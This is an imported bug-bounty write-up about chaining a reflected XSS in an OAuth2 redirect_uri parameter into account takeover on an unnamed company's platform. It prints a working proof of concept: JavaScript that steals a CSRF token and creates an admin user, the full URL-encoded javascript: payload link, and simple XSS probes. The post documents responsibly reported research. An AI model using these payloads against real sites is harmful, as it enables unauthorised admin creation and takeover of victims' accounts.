---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-30_from-reflected-xss-to-account-takeover-showing-xss-impact.md
original_filename: 2019-04-30_from-reflected-xss-to-account-takeover-showing-xss-impact.md
title: From Reflected XSS to Account Takeover — Showing XSS Impact
category: documents
detected_topics:
- oauth
- xss
- access-control
- api-security
- sso
- command-injection
tags:
- imported
- documents
- oauth
- xss
- access-control
- api-security
- sso
- command-injection
language: en
raw_sha256: 0d99a6d5ad5827cbc11c84d4d060a0892edbd5b432601164a59cffe344e8e19e
text_sha256: 8df04c123816f775fdd50ce9190e55ad6be803238d83c265be08a8d28c496111
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# From Reflected XSS to Account Takeover — Showing XSS Impact

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-30_from-reflected-xss-to-account-takeover-showing-xss-impact.md
- Source Type: markdown
- Detected Topics: oauth, xss, access-control, api-security, sso, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `0d99a6d5ad5827cbc11c84d4d060a0892edbd5b432601164a59cffe344e8e19e`
- Text SHA256: `8df04c123816f775fdd50ce9190e55ad6be803238d83c265be08a8d28c496111`


## Content

---
title: "From Reflected XSS to Account Takeover — Showing XSS Impact"
url: "https://medium.com/a-bugz-life/from-reflected-xss-to-account-takeover-showing-xss-impact-9bc6dd35d4e6"
authors: ["A Bug’z Life (@abugzlife1)"]
bugs: ["Reflected XSS", "Account takeover"]
publication_date: "2019-04-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5278
scraped_via: "browseros"
---

# From Reflected XSS to Account Takeover — Showing XSS Impact

From Reflected XSS to Account Takeover — Showing XSS Impact
A Bug’z Life
Follow
5 min read
·
May 1, 2019

615

3

After starting bug hunting a little over 2 months ago, here is our first bug writeup, enjoy!

We’ve been hunting on a private program on 
HackerOne
 for a couple weeks with a fair bit of success, but most findings have been medium-ish severity and nothing to write home about. One big thing we noticed is how devastating XSS vulns would be if targeted to admin users. This was because the invitation of new users, including admins, did not require any form of re-authentication/verification before doing so. We had already found quite a few stored XSS, but didn’t really attempt any privilege escalation because in order to create the stored XSS, you would’ve already needed some level of privileged access. So theoretically we could’ve escalated our privileges, but it wouldn’t have been much more severe than the XSS itself.

Moving forward to more recently, we had been testing the way 2 of their apps integrate together, which uses OAuth2 authentication. Normally, we’d target things like open redirect or CSRF via static state parameters, but those seemed to be handled well. We did notice some quite odd behavior when handling the redirect_uri parameter. Essentially, if any of the other required parameters were incorrect or missing (such as state, client_id, etc.), you would be redirected to an error page with one button to click on that indicated the bad request. That button was an <a> tag and whatever value that was in the redirect_uri parameter was the href value. So naturally we tried javascript:alert(1) as the redirect_uri parameter, and was presented with a beautiful alert box indicating the XSS was successful.

Because we had already found several other XSS’ on this program, it was basically muscle memory to go ahead and submit the report. When doing so, we paused. Remembering back on how their admin/user invitation process looked like, and how an account takeover could easily be performed when finding the right XSS. Alas, this is the perfect XSS to show how easily we can escalate our privileges to an admin level, allowing us to do whatever we’d like. We would be essentially going from zero access (don’t even need a user account, which is important to note as this is an invite only platform), to full access.

After taking a closer look at the POST request to create a new admin, it was a multipart form with about 30 fields, but only a few were required. Those were login, firstname, lastname, email, role_id, and of course csrf-token. So the next step was to figure out how to extract the csrf-token, which proved to be quite simple. When performing a GET request to the user creation endpoint and viewing the source, the csrf-token was found stored in a meta tag, which looks like:

<meta name="csrf-token" content="UdNWofQE+cZSKftgI7GnDpmImM7vTJB9ew3dF53+/Ekwtg2KWw/nRbHdIHIoDd4L+HQ/w7xTUPB2ZHnG01fxnQ==" />

So we can perform a GET request, store the csrf-token value, and then send a POST request to the same endpoint with the required fields. The code to get the token looks like:

var url = "/user/new";
var xhr = new XMLHttpRequest();
  xhr.responseType = "document";
  xhr.open("GET", url, true);
  xhr.onload = function (e) {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
  page = xhr.response
  // Get the csrf token from meta tag
  token = page.getElementsByName('csrf-token')[0].getAttribute('content')
  // Show the token
  console.log("The token is: " + token);
  }
  };
  xhr.send(null);

With this, we now have our CSRF token. The final PoC code to execute the XSS and create ourself an admin user using the token we just extracted looks like:

var url = "/user/new";
function submitFormWithToken(token) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
var formData = new FormData();
  formData.append("authenticity_token", token);
  formData.append("login", "neemaPoC");
  formData.append("firstname", "Neema");
  formData.append("lastname", "PoC");
  formData.append("email", "xss_demo@gmail.com");
  // role_id = 2 is the admin role
  formData.append("role_ids[]", 2);
  formData.append("new_status", "active");
xhr.send(formData);
}
var xhr = new XMLHttpRequest();
  xhr.responseType = "document";
  xhr.open("GET", url, true);
  xhr.onload = function (e) {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
  page = xhr.response
  // Get the csrf token from meta tag
  token = page.getElementsByName('csrf-token')[0].getAttribute('content')
  // Show the token
  console.log("The token is: " + token);
  // Use the token to submit the form
  submitFormWithToken(token);
  }
  };
  // Make the request
  xhr.send(null);

When minified and url encoded, the final PoC reflected XSS URL was (luckily we didn’t have to worry about any length restrictions):

https://company.com/oauth2/authorizations/new?redirect_uri=javascript:var%20url%3D%22%2Fuser%2Fnew%22%3Bfunction%20submitFormWithToken%28e%29%7Bvar%20t%3Dnew%20XMLHttpRequest%3Bt.open%28%22POST%22%2Curl%2C%210%29%3Bvar%20n%3Dnew%20FormData%3Bn.append%28%22authenticity_token%22%2Ce%29%2Cn.append%28%22login%22%2C%22neemaPoC%22%29%2Cn.append%28%22firstname%22%2C%22Neema%22%29%2Cn.append%28%22lastname%22%2C%22PoC%22%29%2Cn.append%28%22email%22%2C%22xss_demo%40gmail.com%22%29%2Cn.append%28%22role_ids%5B%5D%22%2C2%29%2Cn.append%28%22new_status%22%2C%22active%22%29%2Ct.send%28n%29%7Dvar%20xhr%3Dnew%20XMLHttpRequest%3Bxhr.responseType%3D%22document%22%2Cxhr.open%28%22GET%22%2Curl%2C%210%29%2Cxhr.onload%3Dfunction%28e%29%7Bxhr.readyState%3D%3D%3DXMLHttpRequest.DONE%26%26200%3D%3D%3Dxhr.status%26%26%28page%3Dxhr.response%2Ctoken%3Dpage.getElementsByName%28%22csrf-token%22%29%5B0%5D.getAttribute%28%22content%22%29%2Cconsole.log%28%22The%20token%20is%3A%20%22%2Btoken%29%2CsubmitFormWithToken%28token%29%29%7D%2Cxhr.send%28null%29%3B

When clicked on by the user, the 2 requests would be sent, and our admin account would be created. We received a much anticipated registration email in which can be used to set our credentials, and there are never any notifications/confirmations sent to the victim which essentially makes this undetected unless the victim actively verifies account details. For a full account takeover, we could further escalate and delete the other admins as admin is the highest level of access, and one admin can delete any other.

Get A Bug’z Life’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After putting together the working PoC and showing how we could fully exploit this XSS (theoretically as an attacker without a user account), the report was submitted to the team. This was also a great lesson about how to show impact in a report. Historically, as soon as bugs were found, we reported them, without giving much thought in how they could be escalated and showing how bad it really is. This exercise has definitely shown that we should be thinking about this more often.

Since this bug, we’ve tried to escalate every XSS popped instead of simply reporting it, and it’s really improved the impact & reward since doing so. Some examples:

Reflected XSS -> Create Admin User -> Company Account Takeover = 2x Normal XSS Reward
Stored XSS -> Change Victim’s Email -> User Account Takeover = 3x Normal XSS Reward
Reflected XSS -> Call API Endpoint returning credit card numbers = 2x Normal XSS Reward
Reflected XSS -> Change Victim’s Email -> User Account Takeover = 2x Normal XSS Reward

So by instead of just reporting <img src=x onerror=alert(1)> , we’ve started to look at what can actually be done with that XSS, and then write the PoC to prove it as it really shows the company what the impact is, and will most likely net you a better reward.

Hope this was helpful in showing how bugs can be exploited and escalated, and how important it is to show impact in a report. We’ll be sharing more about our bug bounty journey, stay tuned!
